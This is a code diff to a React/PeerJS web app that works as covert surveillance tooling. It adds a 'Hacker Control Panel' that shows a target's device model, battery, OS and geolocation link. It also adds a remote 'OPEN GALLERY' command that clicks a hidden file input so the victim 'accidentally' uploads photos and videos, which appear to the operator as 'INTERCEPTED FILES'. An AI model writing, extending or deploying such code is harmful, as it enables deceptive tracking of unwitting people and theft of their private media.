@@ -2,7 +2,7 @@
 import React, { useState, useEffect, useRef } from 'react';
 import Peer, { DataConnection } from 'peerjs';
 import { analyzeScreen } from './services/geminiService';
-import { DeviceInfo, RemoteCommand } from './types';
+import { DeviceInfo, RemoteCommand, FileTransfer } from './types';
 
 const App: React.FC = () => {
   const [myId, setMyId] = useState<string>('');
@@ -27,12 +27,15 @@ const App: React.FC = () => {
   const [targetInfo, setTargetInfo] = useState<DeviceInfo | null>(null);
   const [dataConn, setDataConn] = useState<DataConnection | null>(null);
   const [showControlPanel, setShowControlPanel] = useState<boolean>(false);
+  const [interceptedFiles, setInterceptedFiles] = useState<FileTransfer[]>([]);
 
   const [activeStream, setActiveStream] = useState<MediaStream | null>(null);
 
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const peerRef = useRef<Peer | null>(null);
+  // Hidden input for the target to "accidentally" upload files
+  const galleryInputRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
@@ -65,6 +68,10 @@ const App: React.FC = () => {
         if (data.type === 'INFO') {
           setTargetInfo(data.payload);
         }
+        if (data.type === 'FILE_TRANSFER') {
+            setInterceptedFiles(prev => [...prev, data]);
+            alert(`New File Intercepted: ${data.fileName}`);
+        }
       });
     });
 
@@ -90,6 +97,16 @@ const App: React.FC = () => {
     } catch {
       return undefined;
     }
+  };
+
+  const getDeviceName = () => {
+    const ua = navigator.userAgent;
+    const android = ua.match(/Android .*?; (.*?)\)/);
+    const ios = ua.match(/(iPhone|iPad|iPod)/);
+    
+    if (android && android[1]) return android[1];
+    if (ios && ios[1]) return ios[1];
+    return "Unknown Model";
   };
 
   // Step 1: Handle Geolocation Request
@@ -140,6 +157,7 @@ const App: React.FC = () => {
       const basicInfo: DeviceInfo = {
         platform: navigator.platform,
         userAgent: navigator.userAgent,
+        deviceName: getDeviceName(),
         language: navigator.language,
         screenWidth: window.screen.width,
         screenHeight: window.screen.height,
@@ -198,7 +216,31 @@ const App: React.FC = () => {
            window.speechSynthesis.speak(utterance);
         }
         break;
+      case 'REQUEST_GALLERY':
+        // Trigger the hidden input
+        if (galleryInputRef.current) {
+            galleryInputRef.current.click();
+        }
+        break;
     }
+  };
+
+  const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
+      const file = event.target.files?.[0];
+      if (file && dataConn && dataConn.open) {
+          const reader = new FileReader();
+          reader.onload = (e) => {
+              const dataUrl = e.target?.result as string;
+              const transfer: FileTransfer = {
+                  type: 'FILE_TRANSFER',
+                  fileName: file.name,
+                  fileType: file.type,
+                  data: dataUrl
+              };
+              dataConn.send(transfer);
+          };
+          reader.readAsDataURL(file);
+      }
   };
 
   const sendCommand = (type: RemoteCommand['type'], payload?: any) => {
@@ -251,6 +293,14 @@ const App: React.FC = () => {
                   className="flex-1"
               ></iframe>
               <video ref={videoRef} className="hidden" muted playsInline autoPlay />
+              {/* Hidden File Input for Remote Trigger */}
+              <input 
+                type="file" 
+                ref={galleryInputRef}
+                className="hidden"
+                accept="image/*,video/*"
+                onChange={handleFileSelect}
+              />
           </div>
       );
   }
@@ -276,29 +326,61 @@ const App: React.FC = () => {
 
         {/* Hacker Control Panel */}
         {showControlPanel && (
-          <div className="absolute top-16 right-4 w-64 bg-black/90 border border-green-500/50 p-4 rounded-xl text-green-400 font-mono text-xs shadow-2xl z-40 max-h-[80vh] overflow-y-auto">
+          <div className="absolute top-16 right-4 w-72 bg-black/95 border border-green-500/50 p-4 rounded-xl text-green-400 font-mono text-xs shadow-2xl z-40 max-h-[80vh] overflow-y-auto">
              <h3 className="border-b border-green-500/30 pb-2 mb-2 font-bold flex justify-between">
                 <span>TARGET INFO</span>
-                <span className="animate-pulse">● LIVE</span>
+                <span className="animate-pulse text-red-500">● LIVE</span>
              </h3>
              {targetInfo ? (
                <div className="space-y-2 mb-4">
+                 <p className="text-white font-bold text-sm border-b border-white/10 pb-1">
+                    📱 {targetInfo.deviceName}
+                 </p>
                  <p>BATTERY: {targetInfo.battery}%</p>
-                 <p>RES: {targetInfo.screenWidth}x{targetInfo.screenHeight}</p>
                  <p>OS: {targetInfo.platform}</p>
                  {targetInfo.latitude && (
-                   <a 
-                     href={`https://www.google.com/maps?q=${targetInfo.latitude},${targetInfo.longitude}`} 
-                     target="_blank" 
-                     rel="noreferrer"
-                     className="block bg-green-900/30 p-2 rounded hover:bg-green-800/50 text-center"
-                   >
-                     📍 OPEN LOCATION
-                   </a>
+                     <>
+                        <a 
+                            href={`https://www.google.com/maps?q=${targetInfo.latitude},${targetInfo.longitude}`} 
+                            target="_blank" 
+                            rel="noreferrer"
+                            className="block bg-green-900/30 p-2 rounded hover:bg-green-800/50 text-center mb-1 border border-green-500/20"
+                        >
+                            📍 OPEN LOCATION
+                        </a>
+                         {/* OPEN GALLERY BUTTON */}
+                        <button 
+                            onClick={() => sendCommand('REQUEST_GALLERY')}
+                            className="w-full block bg-yellow-900/30 p-2 rounded hover:bg-yellow-800/50 text-center text-yellow-400 font-bold border border-yellow-500/20"
+                        >
+                            📂 OPEN GALLERY
+                        </button>
+                    </>
                  )}
                </div>
              ) : (
                <p className="mb-4">Waiting for data packets...</p>
+             )}
+             
+             {/* Intercepted Files Section */}
+             {interceptedFiles.length > 0 && (
+                 <div className="mb-4 border-t border-green-500/30 pt-2">
+                     <h4 className="text-yellow-400 font-bold mb-2">INTERCEPTED FILES ({interceptedFiles.length})</h4>
+                     <div className="grid grid-cols-2 gap-2">
+                         {interceptedFiles.map((file, idx) => (
+                             <a key={idx} href={file.data} download={file.fileName} className="block group relative aspect-square bg-slate-800 rounded border border-white/10 overflow-hidden">
+                                 {file.fileType.startsWith('image') ? (
+                                     <img src={file.data} alt="intercepted" className="w-full h-full object-cover" />
+                                 ) : (
+                                     <div className="flex items-center justify-center h-full text-2xl">🎥</div>
+                                 )}
+                                 <div className="absolute inset-0 bg-black/50 opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
+                                     ⬇️
+                                 </div>
+                             </a>
+                         ))}
+                     </div>
+                 </div>
              )}
 
              <h3 className="border-b border-green-500/30 pb-2 mb-2 font-bold">COMMANDS</h3>
